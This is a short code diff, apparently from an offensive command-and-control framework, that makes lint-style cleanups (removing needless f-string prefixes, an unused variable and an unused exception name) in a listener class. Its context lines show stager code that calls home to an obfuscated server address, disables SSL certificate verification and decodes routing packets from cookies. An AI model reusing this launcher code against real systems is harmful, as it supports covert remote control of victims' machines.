@@ -286,7 +286,7 @@ class Listener(object):
                 stager += f"$ser={ helpers.obfuscate_call_home_address(host) };$t='{ stage0 }';"
 
                 if userAgent.lower() != "none":
-                    stager += f"$wc.Headers.Add('User-Agent',$u);"
+                    stager += "$wc.Headers.Add('User-Agent',$u);"
 
                     if proxy.lower() != "none":
                         if proxy.lower() == "default":
@@ -400,7 +400,7 @@ class Listener(object):
                 if "https" in host:
                     # monkey patch ssl woohooo
                     launcherBase += dedent(
-                        f"""
+                        """
                         import ssl;
                         if hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;
                         """
@@ -839,7 +839,6 @@ class Listener(object):
         bindIP = listenerOptions["BindIP"]["Value"]
         port = listenerOptions["Port"]["Value"]
         stagingKey = listenerOptions["StagingKey"]["Value"]
-        stagerURI = listenerOptions["StagerURI"]["Value"]
         userAgent = listenerOptions["UserAgent"]["Value"]
         listenerName = listenerOptions["Name"]["Value"]
         proxy = listenerOptions["Proxy"]["Value"]
@@ -1028,7 +1027,7 @@ class Listener(object):
                                 base64RoutingPacket = part[part.find("=") + 1 :]
                                 # decode the routing packet base64 value in the cookie
                                 routingPacket = base64.b64decode(base64RoutingPacket)
-                except Exception as e:
+                except Exception:
                     routingPacket = None
                     pass
 
